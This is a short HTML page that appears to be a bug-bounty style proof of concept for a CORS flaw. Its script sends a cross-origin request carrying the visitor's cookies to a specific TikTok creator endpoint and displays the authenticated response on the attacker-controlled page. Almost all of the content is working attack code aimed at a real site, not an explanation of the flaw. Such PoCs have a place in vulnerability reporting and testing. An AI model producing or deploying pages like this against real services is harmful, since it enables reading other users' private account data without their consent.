<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS PoC</title>
</head>
<body>
  <h1>CORS Exploit Test</h1>
  <p>
    This page will attempt to send an authenticated cross-origin request to
    <strong>https://www.tiktok.com/CreativeOne/OrderQuery/CreatorGetPostItemList?limit=12&page=1</strong>
    and display the response below.
  </p>

  <button id="pocButton">Send Cross-Origin Request</button>
  <pre id="responseBox" style="border:1px solid #ccc; padding:1em;"></pre>

  <script>
    document.getElementById('pocButton').addEventListener('click', function() {
      // Use the Fetch API to send a cross-origin request with credentials
      fetch("https://www.tiktok.com/CreativeOne/OrderQuery/CreatorGetPostItemList?limit=12&page=1", {
        method: "GET",
        credentials: "include" // <-- This is critical to include cookies
      })
      .then(response => {
        // Check for successful response
        if (!response.ok) {
          throw new Error("HTTP error, status = " + response.status);
        }
        return response.text();
      })
      .then(data => {
        // Display the response in the <pre> element
        document.getElementById('responseBox').textContent = data;
        console.log("Response Data:", data);
      })
      .catch(error => {
        // Handle any errors
        document.getElementById('responseBox').textContent = "Request failed: " + error;
        console.error("Request failed:", error);
      });
    });
  </script>
</body>
</html>
